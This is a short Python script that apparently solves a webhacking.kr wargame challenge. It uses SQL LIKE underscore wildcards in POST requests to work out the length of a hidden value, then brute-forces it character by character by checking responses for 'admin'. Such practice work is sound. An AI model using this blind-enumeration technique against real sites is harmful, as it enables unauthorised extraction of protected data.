import requests

session_id={'PHPSESSID':''}

length='_'
length_num=1
while(True):
	url = "http://webhacking.kr/challenge/web/web-33/index.php"
	params={'search':length}		
	response=requests.post(url=url,cookies=session_id,data=params)
	if "admin" in response.text:
		length=length+"_"
		length_num+=1
	else:
		length_num-=1
		break
print("length :",length_num)

result='.0hkp'
readme=''
for i in range(length_num):
	for j in result:
		search = "_"*i + str(j) +"_"*(length_num-1-i)
		url = "http://webhacking.kr/challenge/web/web-33/index.php"
		params={'search':search}
		response=requests.post(url=url,cookies=session_id,data=params)
		print(search)
		if "admin" in response.text:
			readme+=str(j)
			break
print(readme)
